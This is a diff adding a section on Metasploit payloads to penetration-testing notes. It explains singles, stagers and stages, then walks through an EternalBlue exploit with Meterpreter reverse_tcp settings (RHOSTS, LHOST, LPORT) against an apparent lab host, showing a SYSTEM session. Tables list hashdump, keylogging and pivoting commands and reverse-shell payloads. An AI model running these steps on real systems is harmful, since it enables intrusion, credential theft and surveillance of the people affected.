@@ -320,3 +320,139 @@ When analyzing custom binaries or non-standard targets:
 
 ---
 
+# Metasploit Payloads: Architecture, Mechanics, & Execution
+
+## Overview
+
+In the Metasploit Framework, a **Payload** is the operational code executed on the target host post-exploitation. While the **Exploit** breaches the vulnerable service, the **Payload** establishes control, typically by spawning an interactive shell, managing network sockets, or loading an in-memory command-and-control agent like **Meterpreter**.
+
+```
++--------------------+        1. Exploit Delivery        +--------------------+
+|    Attacker Box    | --------------------------------> |    Target Host     |
+| (MSF / Listener)   |                                   | (Vulnerable Serv.) |
+|                    |        2. Stage 0 (Stager)        |                    |
+|                    | <================================ | Allocates RWX Mem  |
+|                    |                                   |                    |
+|                    |        3. Stage 1 (Payload)       |                    |
+|                    | --------------------------------> | Reflective DLL Inj |
+|                    |                                   | (Meterpreter/CLI)  |
+| Active Session <---| <================================ | Memory-Resident    |
++--------------------+                                   +--------------------+
+```
+
+## 1. Payload Classifications
+
+Metasploit organizes payloads into three functional architectures:
+
+```
+                                  ┌──────────────────────────────────────────────┐
+                                  │          MSF Payload Classifications         │
+                                  └──────────────────────┬───────────────────────┘
+                                                         │
+         ┌───────────────────────────────────────────────┼───────────────────────────────────────────────┐
+         ▼                                               ▼                                               ▼
++--------------------------------+              +--------------------------------+              +--------------------------------+
+|       Singles (Inline)         |              |            Stagers             |              |            Stages              |
+|  - Completely self-contained   |              |  - Small, reliable bootstrap   |              |  - Large, feature-rich logic   |
+|  - One-shot execution          |              |  - Allocates memory on target  |              |  - Meterpreter, VNC, Mimikatz  |
+|  - Syntax: `os/arch/payload`   |              |  - Connects & fetches Stage 1  |              |  - Downloaded by Stager        |
++--------------------------------+              +--------------------------------+              +--------------------------------+
+```
+
+### Technical Comparison
+
+|**Classification**|**Architecture & Mechanism**|**Naming Convention**|**Primary Pros & Cons**|
+|---|---|---|---|
+|**Singles (Inline)**|Self-contained binary payload; executes directly without additional network requests.|Identified by an underscore (`_`):<br><br>  <br><br>`windows/x64/shell_reverse_tcp`<br><br>  <br><br>`windows/x64/meterpreter_reverse_tcp`|**Pros:** Stable; no network dependency.<br><br>  <br><br>**Cons:** Larger payload size; may exceed small buffer spaces.|
+|**Stagers**|Minimal bootstrap stub that connects back to the handler and prepares target memory (e.g., `VirtualAlloc` with RWX permissions) for the stage.|Identified by slashes (`/`):<br><br>  <br><br>`windows/x64/meterpreter/reverse_tcp`<br><br>  <br><br>`windows/x64/shell/bind_tcp`|**Pros:** Tiny memory footprint; highly reliable.<br><br>  <br><br>**Cons:** Requires multi-stage network transmission.|
+|**Stages**|Advanced functional payloads (Meterpreter, VNC injection) pulled and executed in memory by the stager.|Payload component referenced after the slash:<br><br>  <br><br>`.../meterpreter/...`<br><br>  <br><br>`.../vncinject/...`|**Pros:** Unlimited functionality size; memory-resident.<br><br>  <br><br>**Cons:** Requires an established stager connection.|
+
+> **Windows NX vs. NO-NX Stagers:**
+> 
+> Systems enforcing Data Execution Prevention (DEP) require **NX-compatible stagers** that explicitly call memory allocation APIs (such as `VirtualAlloc`) to mark allocated buffers as executable (`PAGE_EXECUTE_READWRITE`). Modern Metasploit default stagers are NX and Windows 7+ compatible.
+
+## 2. Searching & Filtering Payloads in `msfconsole`
+
+The payload list inside `msfconsole` is extensive. Using `grep` directly within the console accelerates discovery and selection.
+
+```bash
+# Filter for 64-bit Windows Meterpreter reverse TCP stagers
+msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
+
+   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+```
+
+## 3. Practical Payload Configuration & Exploitation
+
+### Step 1: Assign Payload by Index or Path
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+# Alternatively: set payload 15
+```
+
+### Step 2: Configure Required Module & Payload Options
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
+```
+
+### Step 3: Run Exploit & Catch Multi-Stage Session
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] Sending stage (201283 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2026-08-19 11:25:32 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+## 4. Meterpreter In-Memory Capabilities & Core Commands
+
+**Meterpreter** operates entirely within the target process memory via **Reflective DLL Injection**, leaving no operational binaries on disk.
+
+```
+                  ┌──────────────────────────────────────────────┐
+                  │          Meterpreter Command Domain          │
+                  └──────────────────────┬───────────────────────┘
+                                         │
+         ┌───────────────────┬───────────┴───────────┬───────────────────┐
+         ▼                   ▼                       ▼                   ▼
++-----------------+ +-----------------+     +-----------------+ +-----------------+
+|   System / Priv | |   Networking    |     |   File System   | |  Post / Espion  |
+| getuid, getsid  | | ipconfig, route |     | download, upload| | keyscan_start  |
+| getprivs, ps    | | portfwd, arp    |     | ls, cd, rm, pwd | | screenshot, reg |
++-----------------+ +-----------------+     +-----------------+ +-----------------+
+```
+
+### High-Value Meterpreter Commands
+
+|**Category**|**Command**|**Operational Description**|
+|---|---|---|
+|**Privilege / Identity**|`getuid`|Retrieves the active username/SID context (`NT AUTHORITY\SYSTEM`).|
+|**Credential Access**|`hashdump`|Extracts local SAM database password hashes directly from registry memory.|
+|**Process Control**|`migrate <PID>`|Injects and migrates Meterpreter into a more stable system process (e.g., `explorer.exe` or `lsass.exe`).|
+|**Network Pivoting**|`portfwd add ...`|Forwards local attacker ports to internal subnets via the compromised host.|
+|**Surveillance**|`keyscan_start` / `keyscan_dump`|Captures and dumps user keystrokes in real time.|
+|**System Dropping**|`shell`|Opens a native command interpreter channel (`cmd.exe` or `/bin/bash`).|
+
+## 5. Common Windows Payloads Matrix
+
+|**Payload Identifier**|**Architecture**|**Delivery Model**|**Description**|
+|---|---|---|---|
+|`windows/x64/shell_reverse_tcp`|x64|**Single (Inline)**|Standard un-staged reverse command shell.|
+|`windows/x64/shell/reverse_tcp`|x64|**Staged**|Two-stage reverse command prompt.|
+|`windows/x64/meterpreter_reverse_tcp`|x64|**Single (Inline)**|Self-contained, single-binary Meterpreter reverse shell.|
+|`windows/x64/meterpreter/reverse_tcp`|x64|**Staged**|Staged in-memory Reflective DLL Meterpreter session.|
+|`windows/x64/meterpreter/reverse_https`|x64|**Staged (Encrypted)**|Meters communication over TLS/HTTPS (bypasses basic DPI firewalls).|
+|`windows/x64/powershell_reverse_tcp`|x64|**Single (Inline)**|Interactive PowerShell execution session.|
+|`windows/x64/vncinject/reverse_tcp`|x64|**Staged**|Reflective VNC DLL injection granting GUI remote desktop access.|
